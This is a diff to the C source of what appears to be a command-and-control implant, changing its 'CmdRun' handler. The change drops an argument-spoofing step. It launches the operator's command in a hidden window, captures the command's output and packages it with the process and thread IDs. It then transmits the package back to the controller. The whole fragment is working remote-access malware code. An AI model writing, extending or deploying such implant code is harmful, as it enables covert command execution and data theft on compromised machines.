@@ -188,19 +188,20 @@ FUNC VOID CmdRun(
     HANDLE   ThreadHandle  = NULL;
     BOOL     bCheck        = FALSE;
     
-    PWSTR Fake = L"fake argue";
+    PSTR   Output  = Instance()->Win32.LocalAlloc( LPTR, 1025 );    
+    UINT32 OutSize = 0;
 
-    Blackout().Fork.Argue = bkHeapAlloc( StringLengthW( Fake ) * 2 + 1 );
-    MmCopy( Blackout().Fork.Argue, Fake, StringLengthW( Fake ) * 2 + 1 );
-
-    bCheck = bkProcessCreate( ProcCmd, FALSE, CREATE_NEW_CONSOLE, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
+    bCheck = bkProcessCreate( ProcCmd, FALSE, TRUE, CREATE_NO_WINDOW, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId, Output, &OutSize );
     if ( !bCheck )
         return;
 
     PackageAddBool(  BK_PACKAGE, bCheck     );
     PackageAddInt32( BK_PACKAGE, ProcessId  );
     PackageAddInt32( BK_PACKAGE, ThreadId   );
+    PackageAddBytes( BK_PACKAGE, Output, OutSize );
     PackageTransmit( BK_PACKAGE, NULL, NULL );
+
+    if ( Output ) Instance()->Win32.LocalFree( Output );
 }
 
 FUNC VOID CmdExplorer(
